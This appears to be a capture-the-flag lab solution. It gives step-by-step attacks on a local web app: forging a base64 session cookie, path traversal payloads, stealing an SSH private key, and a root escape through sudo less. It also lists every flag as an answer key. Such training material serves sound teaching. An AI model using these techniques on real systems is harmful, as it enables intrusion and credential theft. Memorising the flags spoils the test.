## Solution

### FLAG 1: Cookie Tampering (200 pts)

**Objective**: Gain admin access by manipulating the session cookie.

1. Visit the login page at `http://localhost:4000/login`
2. View page source to find credentials in an HTML comment:
   ```html
   <!-- TODO: Remove before production deployment
        Dev credentials: employee / welcome123
   -->
   ```
3. Login with `employee` / `welcome123`
4. Open browser DevTools → Application → Cookies
5. Find the `session` cookie and decode it (base64):
   ```bash
   echo 'eyJ1c2VybmFtZSI6ICJlbXBsb3llZSIsICJyb2xlIjogImVtcGxveWVlIiwgImF1dGhlbnRpY2F0ZWQiOiB0cnVlfQ==' | base64 -d
   # {"username": "employee", "role": "employee", "authenticated": true}
   ```
6. Modify the role to `admin` and re-encode:
   ```bash
   echo -n '{"username":"employee","role":"admin","authenticated":true}' | base64
   # eyJ1c2VybmFtZSI6ImVtcGxveWVlIiwicm9sZSI6ImFkbWluIiwiYXV0aGVudGljYXRlZCI6dHJ1ZX0=
   ```
7. Set the new cookie value in DevTools
8. Navigate to `/admin` (not linked from dashboard — requires enumeration)
9. **FLAG 1**: `DUNO{4a07d6d7014ca74fae4ecc565bcf83ef}`

### FLAG 2: Data Exfiltration (100 pts)

**Objective**: Find the flag hidden in exported data.

1. On the admin panel, find the "Data Export" section
2. Download `quarterly_report.txt`
3. Read the report carefully — FLAG 2 is embedded in the "Security Audit & Compliance" section as a compliance reference code
4. **FLAG 2**: `DUNO{d5ab0bd0a825df268587c75558cc191f}`

### FLAG 3: Path Traversal (300 pts)

**Objective**: Exploit path traversal in the export endpoint.

1. Notice the export URL format: `/admin/export?file=employees.csv`
2. The `file` parameter is vulnerable to directory traversal
3. Read a flag file outside the data directory:
   ```bash
   curl -b "session=<admin_cookie>" "http://localhost:4000/admin/export?file=../flag3.txt"
   ```
4. **FLAG 3**: `DUNO{c5852f765a390fc1f01a722c070b9e62}`

**Alternative payloads**:
- `?file=../flag3.txt` (relative traversal)
- `?file=/app/flag3.txt` (absolute path — `os.path.join` replaces base when given absolute)
- `?file=....//flag3.txt` (double encoding variant)

### FLAG 4: SSH Key Theft (400 pts)

**Objective**: Steal an SSH private key and log into the server.

1. On the admin panel, the "Server Information" section reveals:
   - SSH Maintenance Port: 2200
   - Service Account: ctfuser
2. Use path traversal to read the SSH private key:
   ```bash
   curl -b "session=<admin_cookie>" "http://localhost:4000/admin/export?file=../../home/ctfuser/.ssh/id_rsa" > stolen_key
   chmod 600 stolen_key
   ```
3. SSH into the server:
   ```bash
   ssh -i stolen_key ctfuser@<host> -p 2200
   ```
4. Read the flag:
   ```bash
   cat ~/flag4.txt
   ```
5. **FLAG 4**: `DUNO{48b6c872c90cb5b56b2ec30b9da5635a}`

### FLAG 5: Privilege Escalation (500 pts)

**Objective**: Escalate from ctfuser to root using a sudo misconfiguration.

1. Once SSH'd in, check sudo permissions:
   ```bash
   sudo -l
   # (root) NOPASSWD: /usr/bin/less
   ```
2. The `less` binary can be used to escape to a shell (GTFOBins):
   ```bash
   sudo /usr/bin/less /etc/profile
   ```
3. Inside `less`, type `!/bin/sh` and press Enter to drop into a root shell
4. Read the root flag:
   ```bash
   cat /root/flag5.txt
   ```
5. **FLAG 5**: `DUNO{3f89aecfa9dadb3f2e2215387220dabe}`

**Alternative**: Since the flag file is short, `sudo less /root/flag5.txt` will display it directly.